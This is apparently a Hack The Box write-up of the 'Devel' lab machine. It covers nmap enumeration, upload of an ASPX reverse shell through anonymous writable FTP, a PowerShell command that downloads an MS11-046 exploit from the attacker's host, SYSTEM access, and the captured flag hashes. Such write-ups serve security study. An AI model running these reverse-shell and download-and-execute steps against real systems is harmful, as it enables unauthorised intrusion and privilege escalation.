# HTB: Devel

## Engagement Overview

**Target:** Devel   
**Box IP:** 10.10.10.5  
**Host IP:** 10.10.14.6     
**Date:** 2025-09-27

------

### Objectives

- Enumerate services and identify misconfigurations.
- Compromise the FTP service.
- Gain initial foothold via uploaded ASPX reverse shell.
- Enumerate the system and escalate privileges with MS11-046.
- Capture `user.txt` and `root.txt`.

------

## Service Enumeration

### Nmap Results

```bash
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png

80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
| http-methods: 
|_  Potentially risky methods: TRACE
```

### FTP Discovery

- Anonymous login allowed with **write access** to IIS root.
- Uploaded an [ASPX reverse shell](https://gist.github.com/qtc-de/19dfc9018685fce1ba2092c8e2382a79) and executed it successfully:

```bash
Listening on [any] 1337 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.5] 49169
Microsoft Windows [Version 6.1.7600]
c:\windows\system32\inetsrv>
```

------

## System Enumeration

**User Privileges**

```powershell
SeChangeNotifyPrivilege       Enabled
SeImpersonatePrivilege        Enabled
SeCreateGlobalPrivilege       Enabled
```

**System Information**

- Host: DEVEL
- OS: Windows 7 Enterprise (no patches)
- Architecture: x86 VM (VMware Virtual Platform)
- Domain: HTB
- Local user: `babis`

**Enumeration Tools**

- `winPEAS` → suggested WinPrivCheck.
- `WinPrivCheck` → suggested PrintSpoofer, but x86 binary failed.
- `Watson` (x86) → unsupported for this Windows 7 build.

At this point, leveraged known kernel exploit (MS11-046).

------

## Privilege Escalation

### MS11-046 Exploit

- Used pre-compiled binary from [abatchy17 repo](https://github.com/abatchy17/WindowsExploits/tree/master/MS11-046).
- Uploaded and executed:

```powershell
powershell (New-Object Net.WebClient).DownloadFile('http://10.10.14.6/ms11.exe','C:\tmp\ms11.exe')
C:\tmp> ms11.exe
```

**Result:**

```powershell
whoami
nt authority\system
```

**Flags:**

```powershell
c:\Users\babis\Desktop> type user.txt
04dbb55ef3ca04e4c70324f2806e2058

c:\Users\Administrator\Desktop> type root.txt
f5706205b5fc6a4276193c5c7b9ef872
```

------

## House Cleaning

- Deleted `C:\tmp\ms11.exe` and working directory.
- No persistence or artifacts left on target.

------

## Tools Utilized

- `nmap`
- `ftp`
- `winPEAS`
- `WinPrivCheck`
- `Watson`
- `MS11-046 exploit`

------

## Key Takeaways

- Anonymous FTP with upload rights is a critical misconfiguration.
- IIS root folder write access allows straightforward webshell execution.
- Windows 7 Enterprise without patches is highly vulnerable